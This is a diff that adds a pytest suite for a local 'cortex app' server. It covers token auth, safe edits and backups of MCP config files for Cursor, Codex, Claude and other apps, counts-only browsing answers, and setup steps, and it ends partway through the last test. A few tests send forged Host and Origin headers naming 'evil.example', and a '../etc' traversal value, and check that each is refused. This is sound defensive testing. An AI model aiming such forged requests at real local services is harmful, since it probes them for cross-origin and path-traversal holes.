@@ -1,0 +1,1462 @@
+"""`cortex app` (docs/design/cortex-app.md): auth, GET never changes anything, every connector
+on a temp home (add, remove, other keys kept, backups, bad files refused), the status shapes,
+the Setup steps, and browsing answers that hold counts only. Nothing runs `claude`, installs or
+downloads: every subprocess, opener and runner probe is faked."""
+
+import http.client
+import io
+import json
+import socket
+import threading
+import time
+import tomllib
+from datetime import UTC, datetime, timedelta
+from pathlib import Path
+
+import pytest
+
+from cortex.app import actions, server, status, targets, wizard
+
+pytestmark = pytest.mark.usefixtures("home")
+ENTRY = {"command": "C:\\tools\\cortex.exe", "args": ["mcp", "--vault", "C:\\notes \"v\""]}
+MARKERS = (b"TITLEMARKER", b"URLMARKER", b"SEARCHMARKER", b"markerdomain", b"EXCERPTMARKER")
+
+
+def _free_port() -> int:
+    with socket.socket() as s:
+        s.bind(("127.0.0.1", 0))
+        return s.getsockname()[1]
+
+
+@pytest.fixture(autouse=True)
+def fakes(monkeypatch):
+    """Record what would run; nothing real starts, opens or answers."""
+    from cortex import localllm
+
+    calls: list = []
+
+    def run(args, timeout=300):
+        calls.append(list(args))
+        return False, "faked"
+
+    def popen(*a, **k):
+        raise AssertionError("a test must not start a process")
+
+    def no_runner(*a, **k):
+        raise OSError("no runner in tests")
+
+    monkeypatch.setattr(targets, "_which", lambda c: None)
+    monkeypatch.setattr(targets, "_run", run)
+    monkeypatch.setattr(actions, "_popen", popen)
+    monkeypatch.setattr(server, "_open", lambda url: calls.append(["open", url]))
+    monkeypatch.setattr(localllm, "_request", no_runner)
+    monkeypatch.setattr(localllm, "_lms_exe", lambda cfg: None)
+    monkeypatch.setattr(status, "RECEIVER_PORT", _free_port())  # never the owner's receiver
+    return calls
+
+
+@pytest.fixture
+def vault(root_committed):
+    (root_committed / ".cortex").mkdir(exist_ok=True)
+    return root_committed
+
+
+def _serve(root):
+    srv, app = server.make_server(root)
+    threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.05},
+                     daemon=True).start()
+    return srv, app
+
+
+@pytest.fixture
+def app(vault):
+    srv, a = _serve(vault)
+    yield a
+    a.receiver.stop()
+    srv.shutdown()
+    srv.server_close()
+
+
+def call(app, method, path, body=None, *, token=True, host=None, origin=None,
+         ctype="application/json"):
+    c = http.client.HTTPConnection("127.0.0.1", app.port, timeout=30)
+    headers = {"Host": host or f"127.0.0.1:{app.port}"}
+    if token:
+        headers["X-Cortex-Token"] = app.token if token is True else token
+    if origin:
+        headers["Origin"] = origin
+    data = None
+    if body is not None:
+        data = json.dumps(body).encode()
+        headers["Content-Type"] = ctype
+    c.request(method, path, body=data, headers=headers)
+    r = c.getresponse()
+    raw = r.read()
+    c.close()
+    try:
+        js = json.loads(raw)
+    except ValueError:
+        js = None
+    return r.status, js, raw, r
+
+
+def wait_job(app, seen: list | None = None) -> dict:
+    for _ in range(600):
+        _, js, raw, _ = call(app, "GET", "/api/job")
+        if seen is not None:
+            seen.append(raw)
+        if js["job"] and not js["job"]["running"]:
+            return js["job"]
+        time.sleep(0.05)
+    raise AssertionError("job did not finish")
+
+
+def snapshot(*dirs: Path) -> dict:
+    out = {}
+    for d in dirs:
+        for p in sorted(d.rglob("*")):
+            out[str(p)] = p.read_bytes() if p.is_file() else None
+    return out
+
+
+# ---- auth ----------------------------------------------------------------------------------
+
+
+def test_no_token_401_and_the_page_takes_it_from_the_url(app):
+    assert call(app, "GET", "/api/status", token=False)[0] == 401
+    assert call(app, "GET", "/api/status", token="wrong")[0] == 401
+    # the page shell holds no data, so a reload without the key still loads it (the tab keeps
+    # the key in sessionStorage); every API call still needs the key
+    status_, _, raw, _ = call(app, "GET", "/", token=False)
+    assert status_ == 200 and app.token.encode() not in raw
+    assert call(app, "GET", "/app.js", token=False)[0] == 200
+    status_, _, raw, r = call(app, "GET", f"/?t={app.token}", token=False)
+    assert status_ == 200 and f"/app.js?t={app.token}".encode() in raw
+    assert b"<script>" not in raw and b"{{T}}" not in raw  # no inline script
+    csp = r.getheader("Content-Security-Policy")
+    assert "default-src 'self'" in csp and "unsafe" not in csp
+    assert r.getheader("Referrer-Policy") == "no-referrer"
+    assert call(app, "GET", f"/app.js?t={app.token}", token=False)[0] == 200
+    assert call(app, "GET", f"/app.css?t={app.token}", token=False)[0] == 200
+    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
+    assert "innerHTML" not in js and "insertAdjacentHTML" not in js
+
+
+def test_wrong_host_or_origin_403(app):
+    assert call(app, "GET", "/api/status", host="evil.example:80")[0] == 403
+    assert call(app, "GET", "/api/status", host=f"127.0.0.1:{app.port + 1}")[0] == 403
+    assert call(app, "GET", "/api/status", origin="http://evil.example")[0] == 403
+    assert call(app, "POST", "/api/quit", {}, origin="null")[0] == 403
+    assert call(app, "GET", "/api/status", origin=f"http://127.0.0.1:{app.port}")[0] == 200
+    assert call(app, "GET", "/api/status", host=f"localhost:{app.port}")[0] == 200
+    assert not app.stop.is_set()
+
+
+def test_writes_need_post_with_json(app):
+    assert call(app, "POST", "/api/quit", {}, ctype="text/plain")[0] == 415
+    assert call(app, "POST", "/api/quit", {}, token=False)[0] == 401
+    assert call(app, "GET", "/api/quit")[0] == 405
+    assert call(app, "PUT", "/api/quit", {})[0] == 405
+    assert not app.stop.is_set()
+    assert call(app, "POST", "/api/quit", {})[0] == 200
+    assert app.stop.is_set()
+
+
+def test_get_never_changes_anything(app, vault, home, fakes):
+    (home / ".cursor").mkdir()
+    before = snapshot(home, vault)
+    for path in [*app.get, *app.post]:
+        code = call(app, "GET", path)[0]
+        assert code in (200, 405), path
+    assert snapshot(home, vault) == before
+    assert app.jobs.cur is None and not app.stop.is_set()
+    assert not [c for c in fakes if c and c[0] != "schtasks"]  # only the read-only query
+
+
+# ---- status --------------------------------------------------------------------------------
+
+
+def test_status_shapes(app, vault):
+    _, js, _, _ = call(app, "GET", "/api/status")
+    assert js["first_run"] is False and js["vault"] == str(vault.resolve())
+    ids = [r["id"] for r in js["rows"]]
+    assert ids == ["vault", "embed", "apps", "llm", "receiver", "extension", "processing",
+                   "dashboard"]
+    for r in js["rows"]:
+        assert r["state"] in ("ok", "warn", "off") and r["label"] and r["detail"]
+    v = js["rows"][0]
+    assert v["state"] == "ok" and v["count"] > 0
+    for path in ("/api/connect", "/api/llm", "/api/browse", "/api/vault", "/api/setup"):
+        code, body, _, _ = call(app, "GET", path)
+        assert code == 200 and isinstance(body, dict), path
+    _, llm, _, _ = call(app, "GET", "/api/llm")
+    assert llm["enabled"] is False and llm["lms"] is None and llm["ollama"] is None
+
+
+def test_status_logs_only_unexpected_errors(monkeypatch, caplog):
+    """T8: a runner that is not running stays silent; a bug is logged and still reads as
+    "not available"."""
+    from cortex import browse, localllm
+
+    assert status.ollama_models() is None and status.browse_settings()["available"] is True
+    assert not caplog.records  # the fixture's runner raises OSError: an expected state
+
+    def boom(*a, **k):
+        raise RuntimeError("bug")
+
+    monkeypatch.setattr(localllm, "_request", boom)
+    monkeypatch.setattr(browse, "load_settings", boom)
+    assert status.ollama_models() is None and status.browse_settings() == {"available": False}
+    assert [r.levelname for r in caplog.records] == ["ERROR", "ERROR"]
+    assert all(r.exc_info for r in caplog.records)
+
+
+def test_lands_on_setup_until_the_vault_and_an_app_or_a_skipped_connect(app, monkeypatch):
+    """R5 F3 (decided): Status once the vault is set up and an AI app is connected, or Connect
+    was skipped; the skip is kept in ~/.cortex/config.yaml and un-skipping clears it."""
+    from cortex import taint
+
+    taint.write_config({"app": {"other": 1}})
+    assert call(app, "GET", "/api/status")[1]["land"] == "setup"  # vault only
+    assert call(app, "GET", "/api/setup")[1]["connect_skipped"] is False
+    assert call(app, "POST", "/api/setup/skip", {"skipped": True})[0] == 200
+    assert taint.config()["app"] == {"other": 1, "connect_skipped": True}
+    assert call(app, "GET", "/api/status")[1]["land"] == "status"
+    assert call(app, "GET", "/api/setup")[1]["connect_skipped"] is True
+    assert call(app, "POST", "/api/setup/skip", {"skipped": False})[0] == 200
+    assert taint.config()["app"] == {"other": 1}
+    assert call(app, "GET", "/api/status")[1]["land"] == "setup"
+    assert call(app, "POST", "/api/setup/skip", {"skipped": "yes"})[0] == 400
+    monkeypatch.setattr(targets, "describe", lambda base: [{"label": "Claude", "connected": True}])
+    assert call(app, "GET", "/api/status")[1]["land"] == "status"
+
+
+def test_llm_board_shows_a_refused_config(app):
+    """R5 F4: the Local model page reads `localllm.status`, so a cloud model says why."""
+    from cortex import taint
+
+    taint.write_config({"localllm": {"enabled": True, "model": "gpt-oss:120b-cloud"}})
+    _, llm, _, _ = call(app, "GET", "/api/llm")
+    assert "cloud model is refused" in llm["error"]
+    taint.write_config({"localllm": {"enabled": True}})
+    assert call(app, "GET", "/api/llm")[1]["error"] is None
+
+
+def test_first_run_without_a_vault():
+    srv, a = _serve(None)
+    try:
+        _, js, _, _ = call(a, "GET", "/api/status")
+        assert js["first_run"] is True and js["rows"][0]["state"] == "off"
+        code, body, _, _ = call(a, "POST", "/api/vault/backup", {})
+        assert code == 400 and "vault" in body["error"]
+    finally:
+        srv.shutdown()
+        srv.server_close()
+
+
+def test_run_prints_the_link_and_quits(vault):
+    lines: list[str] = []
+    t = threading.Thread(target=server.run, args=(vault,),
+                         kwargs={"open_browser": False, "echo": lines.append}, daemon=True)
+    t.start()
+    for _ in range(100):
+        if lines:
+            break
+        time.sleep(0.05)
+    url = lines[0].split(": ", 1)[1]
+    port, token = int(url.split(":")[2].split("/")[0]), url.split("?t=")[1]
+    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
+    c.request("POST", "/api/quit", body=b"{}", headers={
+        "Host": f"127.0.0.1:{port}", "X-Cortex-Token": token,
+        "Content-Type": "application/json"})
+    assert c.getresponse().status == 200
+    t.join(15)
+    assert not t.is_alive()
+
+
+# ---- connectors on temp homes --------------------------------------------------------------
+
+
+JSON_TARGETS = {"antigravity": ".gemini/antigravity/mcp_config.json", "cursor": ".cursor/mcp.json",
+                "windsurf": ".codeium/windsurf/mcp_config.json", "lmstudio": ".lmstudio/mcp.json",
+                "gemini-cli": ".gemini/settings.json", "vscode": None}
+
+
+def _baks(p: Path) -> list[Path]:
+    return sorted(p.parent.glob(p.name + ".cortex-*.bak"))
+
+
+@pytest.mark.parametrize("tid", JSON_TARGETS)
+def test_json_connector_add_remove_keep_backup(home, tid):
+    rel = JSON_TARGETS[tid]
+    path = home / rel if rel else targets._vscode_user() / "mcp.json"  # APPDATA is in home
+    assert str(path).startswith(str(home))
+    key = "servers" if tid == "vscode" else "mcpServers"
+    t = targets.by_id()[tid]
+    assert not t.detect() and not t.connected()
+    path.parent.mkdir(parents=True)
+    assert t.detect()
+    old = {"theme": "dark", key: {"other": {"command": "x"}}}
+    path.write_text(json.dumps(old, indent=4), encoding="utf-8")
+    original = path.read_bytes()
+    assert [r["change"] for r in t.plan(True, ENTRY)][:1] == ["add"]
+    t.apply(ENTRY)
+    data = json.loads(path.read_text(encoding="utf-8"))
+    assert data["theme"] == "dark" and data[key]["other"] == {"command": "x"}
+    assert data[key]["cortex"] == ({"type": "stdio", **ENTRY} if tid == "vscode" else ENTRY)
+    assert t.connected() and t.plan(True, ENTRY) == []
+    assert [b.read_bytes() for b in _baks(path)] == [original]
+    t.remove()
+    data = json.loads(path.read_text(encoding="utf-8"))
+    assert "cortex" not in data[key] and data[key]["other"] == {"command": "x"}
+    assert data["theme"] == "dark" and not t.connected() and len(_baks(path)) == 2
+
+
+@pytest.mark.parametrize("bad", ["{not json", "[1, 2]", '{"mcpServers": []}',
+                                 '{\n  // a comment\n  "mcpServers": {}\n}'])
+def test_bad_json_is_refused_and_untouched(home, bad):
+    path = home / ".cursor" / "mcp.json"
+    path.parent.mkdir(parents=True)
+    path.write_text(bad, encoding="utf-8")
+    t = targets.by_id()["cursor"]
+    rows = t.plan(True, ENTRY)
+    assert rows[0]["change"] == "error" and "untouched" in rows[0]["detail"]
+    with pytest.raises(ValueError, match="untouched"):
+        t.apply(ENTRY)
+    assert path.read_text(encoding="utf-8") == bad and not _baks(path)
+
+
+def test_new_file_gets_no_backup(home):
+    (home / ".cursor").mkdir()
+    t = targets.by_id()["cursor"]
+    t.apply(ENTRY)
+    p = home / ".cursor" / "mcp.json"
+    assert json.loads(p.read_text())["mcpServers"]["cortex"] == ENTRY and not _baks(p)
+
+
+def test_claude_desktop_uses_its_config_folder(home):
+    folder = home / "APPDATA" / "Claude"
+    t = targets.by_id()["claude-desktop"]
+    if not str(folder).startswith(str(home)):
+        pytest.skip("APPDATA is not under the temp home")
+    assert not t.detect()
+    folder.mkdir(parents=True)
+    cfg = folder / "claude_desktop_config.json"
+    cfg.write_text('{"preferences": {"x": 1}}', encoding="utf-8")
+    assert t.detect() and t.plan(True, ENTRY)[0]["file"] == str(cfg)
+    t.apply(ENTRY)
+    data = json.loads(cfg.read_text())
+    assert data["preferences"] == {"x": 1} and data["mcpServers"]["cortex"] == ENTRY
+    t.remove()
+    assert json.loads(cfg.read_text())["mcpServers"] == {} and len(_baks(cfg)) == 2
+
+
+def test_gemini_block_between_markers(home):
+    (home / ".gemini").mkdir()
+    md = home / ".gemini" / "GEMINI.md"
+    md.write_text("# Mine\n\nKeep this.\n", encoding="utf-8")
+    t = targets.by_id()["gemini-cli"]
+    assert {r["file"] for r in t.plan(True, ENTRY)} == {str(home / ".gemini" / "settings.json"),
+                                                        str(md)}
+    t.apply(ENTRY)
+    t.apply(ENTRY)  # idempotent: one block
+    text = md.read_text(encoding="utf-8")
+    assert text.count(targets.Gemini.START) == 1 and text.startswith("# Mine\n\nKeep this.\n")
+    t.remove()
+    assert md.read_text(encoding="utf-8") == "# Mine\n\nKeep this.\n"
+    assert t.plan(False) == []
+
+
+CODEX = """# my settings
+model = "o3"
+
+[mcp_servers.other]
+command = "other"
+args = ["a"]
+
+[mcp_servers.other.env]
+KEY = "v"
+
+[profiles.fast]
+model = "o4-mini"
+"""
+
+
+def test_codex_toml_exact_writer(home):
+    p = home / ".codex" / "config.toml"
+    p.parent.mkdir()
+    p.write_text(CODEX, encoding="utf-8")
+    t = targets.by_id()["codex"]
+    assert t.detect() and not t.connected()
+    t.apply(ENTRY)
+    data = tomllib.loads(p.read_text(encoding="utf-8"))
+    assert data["mcp_servers"]["cortex"] == ENTRY and data["model"] == "o3"
+    assert data["mcp_servers"]["other"]["env"] == {"KEY": "v"}
+    assert data["profiles"]["fast"]["model"] == "o4-mini"
+    assert p.read_text(encoding="utf-8").startswith(CODEX.rstrip("\n"))
+    assert t.connected() and t.plan(True, ENTRY) == []
+    t.remove()
+    assert p.read_text(encoding="utf-8") == CODEX and len(_baks(p)) == 2
+
+
+def test_codex_refuses_bad_or_inline_toml(home):
+    p = home / ".codex" / "config.toml"
+    p.parent.mkdir()
+    t = targets.by_id()["codex"]
+    for bad in ('model = "o3\n', 'mcp_servers = { cortex = { command = "x" } }\n'):
+        p.write_text(bad, encoding="utf-8")
+        assert t.plan(True, ENTRY)[0]["change"] == "error"
+        with pytest.raises(ValueError):
+            t.apply(ENTRY)
+        assert p.read_text(encoding="utf-8") == bad and not _baks(p)
+
+
+def test_codex_sub_table_of_cortex_goes_too(home):
+    p = home / ".codex" / "config.toml"
+    p.parent.mkdir()
+    p.write_text('[mcp_servers.cortex]\ncommand = "old"\n\n[mcp_servers.cortex.env]\nA = "1"\n'
+                 '\n[tui]\nx = 1\n', encoding="utf-8")
+    targets.by_id()["codex"].apply(ENTRY)
+    data = tomllib.loads(p.read_text(encoding="utf-8"))
+    assert data["mcp_servers"]["cortex"] == ENTRY and data["tui"] == {"x": 1}
+
+
+def test_claude_code_plugin_via_cli(home, monkeypatch, fakes):
+    monkeypatch.setattr(targets, "_which", lambda c: "C:\\bin\\claude.exe" if c == "claude"
+                        else None)
+    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (fakes.append(args),
+                                                                     (True, "ok"))[1])
+    t = targets.by_id()["claude-code"]
+    assert t.detect() and not t.connected()
+    plan = t.plan(True, ENTRY)
+    assert len(plan) == 1 and "claude plugin install cortex@cortex" in plan[0]["detail"]
+    t.apply(ENTRY)
+    from cortex import cli
+    assert fakes[-2:] == [["C:\\bin\\claude.exe", "plugin", "marketplace", "add",
+                           str(cli._marketplace())],
+                          ["C:\\bin\\claude.exe", "plugin", "install", "cortex@cortex"]]
+    s = home / ".claude" / "settings.json"
+    s.parent.mkdir()
+    s.write_text('{"enabledPlugins": {"cortex@cortex": true}}', encoding="utf-8")
+    assert t.connected() and t.plan(True, ENTRY) == []
+    t.remove()
+    assert fakes[-1] == ["C:\\bin\\claude.exe", "plugin", "uninstall", "cortex@cortex"]
+
+
+def test_claude_code_without_cli_edits_claude_json(home):
+    p = home / ".claude.json"
+    p.write_text('{"numStartups": 3, "mcpServers": {"x": {"command": "y"}}}', encoding="utf-8")
+    t = targets.by_id()["claude-code"]
+    assert t.detect()
+    t.apply(ENTRY)
+    data = json.loads(p.read_text())
+    assert data["numStartups"] == 3 and data["mcpServers"]["x"] == {"command": "y"}
+    assert data["mcpServers"]["cortex"] == ENTRY and t.connected()
+    t.remove()
+    assert "cortex" not in json.loads(p.read_text())["mcpServers"]
+
+
+def test_connect_over_the_api(app, home, vault):
+    (home / ".cursor").mkdir()
+    _, js, _, _ = call(app, "GET", "/api/connect")
+    rows = {r["id"]: r for r in js["targets"]}
+    assert len(rows) == 9 and rows["cursor"]["detected"] and not rows["windsurf"]["detected"]
+    assert str(vault.resolve()) in json.loads(rows["cursor"]["snippet"])[
+        "mcpServers"]["cortex"]["args"]
+    want = {"cursor": True, "windsurf": True}
+    _, plan, _, _ = call(app, "POST", "/api/connect/plan", {"want": want})
+    assert [(r["id"], r["change"]) for r in plan["rows"]] == [("cursor", "add")]  # not found
+    assert not (home / ".cursor" / "mcp.json").exists()
+    assert call(app, "POST", "/api/connect/apply", {"want": want})[0] == 200
+    job = wait_job(app)
+    assert job["error"] is None and [r["id"] for r in job["result"]["rows"]] == ["cursor"]
+    assert "cortex" in json.loads((home / ".cursor" / "mcp.json").read_text())["mcpServers"]
+    call(app, "POST", "/api/connect/apply", {"want": {"cursor": False}})
+    wait_job(app)
+    assert json.loads((home / ".cursor" / "mcp.json").read_text())["mcpServers"] == {}
+    assert call(app, "POST", "/api/connect/plan", {"want": {"cursor": "yes"}})[0] == 400
+
+
+# ---- browsing: counts only -----------------------------------------------------------------
+
+
+def _browsing(home: Path, vault: Path) -> None:
+    """Synthetic history and extension inbox, every text field carrying a marker."""
+    from cortex.browse.selftest import _chromium
+
+    now = datetime.now(UTC) - timedelta(days=1)
+    _chromium(home / "LOCALAPPDATA" / "Google" / "Chrome" / "User Data" / "Default" / "History",
+              [(now, "https://markerdomain.example/URLMARKER", "Chess TITLEMARKER"),
+               (now + timedelta(minutes=5), "https://www.google.com/search?q=SEARCHMARKER",
+                "SEARCHMARKER - Google"),
+               (now + timedelta(minutes=9), "https://example.org/a", "Algebra TITLEMARKER")])
+    d = vault / ".cortex" / "browse"
+    d.mkdir(parents=True)
+    (d / "token").write_text("tok", encoding="utf-8")
+    rec = {"url": "https://markerdomain.example/x?URLMARKER=1", "title": "Read TITLEMARKER",
+           "start": now.strftime("%Y-%m-%dT%H:%M:%S.000Z"), "active_ms": 60000,
+           "excerpt": "EXCERPTMARKER text", "kind": "page"}
+    (d / f"inbox-{now:%Y-%m-%d}.jsonl").write_text(json.dumps(rec) + "\n", encoding="utf-8")
+
+
+def test_browsing_answers_hold_counts_only(app, home, vault):
+    _browsing(home, vault)
+    seen: list[bytes] = []
+    for path in ("/api/status", "/api/browse", "/api/setup"):
+        seen.append(call(app, "GET", path)[2])
+    for path in ("/api/browse/scan", "/api/browse/process", "/api/browse/selftest"):
+        code, _, raw, _ = call(app, "POST", path, {})
+        assert code == 200, raw
+        seen.append(raw)
+        job = wait_job(app, seen)
+        assert job["error"] is None, job
+        if path.endswith("scan"):
+            rows = job["result"]["rows"]
+            assert rows[0]["source"] == "chrome/Default" and rows[0]["visits"] == 3
+        if path.endswith("process"):
+            assert job["result"]["counts"]  # numbers
+            assert any((vault / "browse" / "private").glob("*.md"))  # it really ran
+    seen.append(call(app, "GET", "/api/browse")[2])
+    every = b"".join(seen)
+    assert every and not [m for m in MARKERS if m in every]
+    _, b, _, _ = call(app, "GET", "/api/browse")
+    assert b["paired"] is True and b["last_processed"] and isinstance(b["queued"], int)
+
+
+def test_past_history_scan_then_import_mocked(app, home, monkeypatch):
+    from cortex.browse import build, sources
+
+    found = [sources.Source("chrome", "Default", home / "a"),
+             sources.Source("comet", "Default", home / "b")]
+    monkeypatch.setattr(sources, "discover", lambda *a, **k: found)
+    monkeypatch.setattr(sources, "scan", lambda srcs, settings, tz=None: [
+        {"source": "chrome/Default", "visits": 12, "searches": 2, "first": "2021-01-02",
+         "last": "2026-11-16", "dropped": 1, "private": 3, "kept": 8, "maybe": 0},
+        {"source": "comet/Default", "error": "OSError", "why": "locked TITLEMARKER"}])
+    runs = []
+
+    def fake_run(v, srcs, settings, *, embed=None, runner=None, budget=None, progress=None,
+                 **kw):
+        runs.append(([s.key for s in srcs], kw))
+        for s in srcs:
+            progress(s.key, 12, 12, None)
+        return {"sources": len(srcs), "kept": 8, "private": 3, "dropped": 1,
+                "private_written": 5, "public_written": 0, "days_from": "2020-12-28",
+                "visible_to_claude": False}
+
+    monkeypatch.setattr(build, "run", fake_run)
+    from cortex import semantic
+    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default"]})
+    job = wait_job(app)  # no search model: it stops first and offers the download
+    assert job["result"]["need"] == "embed" and "search model first" in job["result"]["lines"][0]
+    assert runs == []
+    monkeypatch.setattr(semantic, "load_embedder", lambda *a, **k: lambda texts: None)
+    _, b, _, _ = call(app, "GET", "/api/browse")
+    assert [s["key"] for s in b["history"]["sources"]] == ["chrome/Default", "comet/Default"]
+    assert "visits" not in b["history"]["sources"][0]  # found by file; not read until a scan
+    seen: list[bytes] = []
+    call(app, "POST", "/api/browse/scan", {"from": "setup"})
+    assert wait_job(app, seen)["section"] == "setup"
+    _, s, raw, _ = call(app, "GET", "/api/setup")
+    hs = s["history"]["sources"]
+    assert hs[0]["visits"] == 12 and hs[0]["first"] == "2021-01-02" and hs[1]["error"] is True
+    assert not s["history"]["done"]
+    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default"]})
+    job = wait_job(app, seen)
+    assert runs == [(["chrome/Default"], {"takeout": None})]  # no `since`: all past history
+    c = job["result"]["counts"]
+    assert (c["days_written"], c["private_pages"], c["dropped"], c["local_model_used"]) == \
+        (5, 5, 1, False)
+    assert b"TITLEMARKER" not in raw + b"".join(seen)
+    assert call(app, "POST", "/api/browse/import", {"sources": []})[0] == 400
+
+    gate = threading.Event()
+
+    def slow_run(v, srcs, settings, *, progress=None, **kw):
+        progress(srcs[0].key, 1, 1, None)
+        gate.wait(5)
+        progress(srcs[0].key, 1, 1, None)  # Cancel is checked at each progress call
+        raise AssertionError("not cancelled")
+
+    monkeypatch.setattr(build, "run", slow_run)
+    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default", "comet/Default"]})
+    time.sleep(0.2)
+    call(app, "POST", "/api/job/cancel", {})
+    gate.set()
+    job = wait_job(app)
+    assert job["error"] is None and job["result"]["cancelled"]
+
+
+def test_safe_keeps_numbers_and_dates_only():
+    got = status.safe({"n": 3, "ok": True, "day": "2026-11-17", "t": "2026-11-17T10:00:00Z",
+                       "title": "Chess TITLEMARKER", "url": "https://x.example/2026-11-17",
+                       "nested": {"a": 1}})
+    assert got == {"n": 3, "ok": True, "day": "2026-11-17", "t": "2026-11-17T10:00:00Z"}
+
+
+def test_pair_and_in_app_receiver(app, vault, monkeypatch):
+    from cortex import browse_serve
+    monkeypatch.setattr(browse_serve, "PORT", 0)  # never 8799: the owner's may be running
+    code, body, _, _ = call(app, "POST", "/api/browse/receiver", {"on": True})
+    assert code == 400 and "Pair" in body["error"]
+    _, body, _, _ = call(app, "POST", "/api/browse/pair", {})
+    assert len(body["token"]) > 20
+    assert (vault / ".cortex" / "browse" / "token").read_text().strip() == body["token"]
+    assert call(app, "POST", "/api/browse/receiver", {"on": True})[0] == 200
+    _, b, _, _ = call(app, "GET", "/api/browse")
+    assert b["receiver"] == "running" and b["in_app"] is True
+    assert call(app, "POST", "/api/browse/receiver", {"on": False})[0] == 200
+    assert app.receiver.srv is None
+
+
+def test_browse_settings_saved_and_checked(app, home):
+    body = {"visible_to_claude": False, "adult": "private", "sensitive": "private",
+            "deny": "a.example\nB.example", "allow": [], "private": ["c.example"]}
+    assert call(app, "POST", "/api/browse/settings", body)[0] == 200
+    from cortex import taint
+    b = taint.config()["browse"]
+    assert b["deny_domains"] == ["a.example", "b.example"] and b["adult"] == "private"
+    assert call(app, "POST", "/api/browse/settings", {**body, "adult": "x"})[0] == 400
+    assert call(app, "POST", "/api/browse/settings", {**body, "deny": "a b/c"})[0] == 400
+
+
+# ---- dashboard and vault, open --------------------------------------------------------------
+
+
+def test_vault_actions(app, vault, fakes):
+    call(app, "POST", "/api/vault/doctor", {})
+    job = wait_job(app)
+    assert job["error"] is None and any("Python" in x for x in job["result"]["lines"])
+    call(app, "POST", "/api/vault/backup", {})
+    job = wait_job(app)
+    assert job["result"]["ok"] and list((vault / ".cortex" / "backups").glob("*.zip"))
+    assert call(app, "POST", "/api/open", {"what": "vault"})[0] == 200
+    assert fakes[-1][1].startswith("obsidian://open?path=")
+    assert call(app, "POST", "/api/open", {"what": "../etc"})[0] == 400
+    assert call(app, "POST", "/api/open", {"what": "dashboard"})[0] == 400  # not built
+
+
+def test_one_job_at_a_time(app):
+    gate = threading.Event()
+    app.jobs.start("slow", "vault", lambda job: gate.wait(5))
+    code, body, _, _ = call(app, "POST", "/api/vault/backup", {})
+    assert code == 409 and "slow" in body["error"]
+    gate.set()
+    wait_job(app)
+
+
+# ---- Setup ----------------------------------------------------------------------------------
+
+
+def test_recommendation_by_memory(monkeypatch):
+    assert [wizard.recommend(g) for g in (None, 2, 4, 5.9, 6, 8, 9.9, 10, 24)] == \
+        ["2b", "2b", "2b", "2b", "4b", "4b", "4b", "9b", "9b"]
+    monkeypatch.setattr(targets, "_which", lambda c: "nvidia-smi")
+    monkeypatch.setattr(targets, "_run", lambda a, timeout=0: (True, "8192\n6144\n"))
+    assert wizard.hardware() == {"kind": "gpu", "gb": 8.0,
+                                 "label": "8 GB of graphics memory (NVIDIA)"}
+    monkeypatch.setattr(targets, "_which", lambda c: None)
+    assert wizard.hardware()["kind"] == "ram"
+
+
+class FakeProc:
+    def __init__(self, out: bytes, block: bool = False):
+        self.stopped = threading.Event()
+        self.data, self.block, self.rc = io.BytesIO(out), block, 0
+        self.stdout = self
+
+    def read1(self, n):
+        chunk = self.data.read(n)
+        if not chunk and self.block:
+            self.stopped.wait(10)
+        return chunk
+
+    def wait(self):
+        return 1 if self.stopped.is_set() else self.rc
+
+    def terminate(self):
+        self.stopped.set()
+
+
+def test_setup_pull_streams_progress_and_cancels(app, monkeypatch):
+    started = []
+    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
+                        else None)
+    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
+        started.append(args), FakeProc(b"pulling 10%\rpulling 100%\r\nsuccess\n"))[1])
+    call(app, "POST", "/api/setup/pull", {"model": "2b", "runner": "ollama"})  # not serving
+    assert wizard.STOPPED.format("Ollama") in wait_job(app)["error"] and started == []
+    monkeypatch.setattr(status, "ollama_models", lambda: [])
+    call(app, "POST", "/api/setup/pull", {"model": "2b", "runner": "ollama"})
+    job = wait_job(app)
+    assert started == [["C:\\o\\ollama.exe", "pull", "qwen3.5:2b"]]
+    assert job["result"]["ok"] and job["result"]["lines"][-1] == "success"
+    proc = FakeProc(b"pulling 1%\n", block=True)
+    monkeypatch.setattr(actions, "_popen", lambda args, **k: proc)
+    call(app, "POST", "/api/setup/pull", {"model": "9b", "runner": "ollama"})
+    time.sleep(0.2)
+    call(app, "POST", "/api/job/cancel", {})
+    job = wait_job(app)
+    assert job["result"]["cancelled"] and not job["result"]["ok"]
+    assert call(app, "POST", "/api/setup/pull", {"model": "70b", "runner": "ollama"})[0] == 400
+
+
+def test_setup_install_runs_only_the_shown_command(app, monkeypatch):
+    plan = wizard.install_plan()
+    assert plan["size"] and plan["source"] and plan["page"].startswith("https://ollama.com")
+    if plan["run"] is None:  # no winget/brew here: nothing to run
+        assert call(app, "POST", "/api/setup/install", {})[0] == 200
+        assert "yourself" in wait_job(app)["error"]
+        return
+    started = []
+    monkeypatch.setattr(actions, "_popen", lambda args, **k: (started.append(args),
+                                                              FakeProc(b"ok\n"))[1])
+    call(app, "POST", "/api/setup/install", {})
+    wait_job(app)
+    assert started == [plan["run"]]
+
+
+def test_setup_test_turns_the_model_on(app, monkeypatch):
+    from cortex import localllm, taint
+
+    class Fake:
+        def describe(self):
+            return "ollama qwen3.5:4b at 127.0.0.1:11434"
+
+        def classify(self, text, labels):
+            assert text == actions.TEST_TEXT
+            return "programming", 0.9
+
+    seen = []
+    monkeypatch.setattr(localllm, "find", lambda config=None: (seen.append(config), Fake())[1])
+    call(app, "POST", "/api/setup/test", {"model": "4b", "runner": "ollama"})
+    job = wait_job(app)
+    assert job["error"] is None and job["result"]["answer"] == "programming"
+    assert seen[0]["localllm"]["enabled"] is True
+    assert taint.config()["localllm"] == {"enabled": True, "model": "qwen3.5:4b",
+                                          "runner": "ollama"}
+
+
+def test_runner_states_and_a_stopped_test_says_start(app, monkeypatch):
+    from cortex import localllm
+
+    assert wizard.runner_state("ollama") == "not_installed"
+    assert wizard.runner_state("lmstudio") == "not_installed"
+    monkeypatch.setattr(targets, "_which", lambda c: "C:\\o\\ollama.exe" if c == "ollama"
+                        else None)
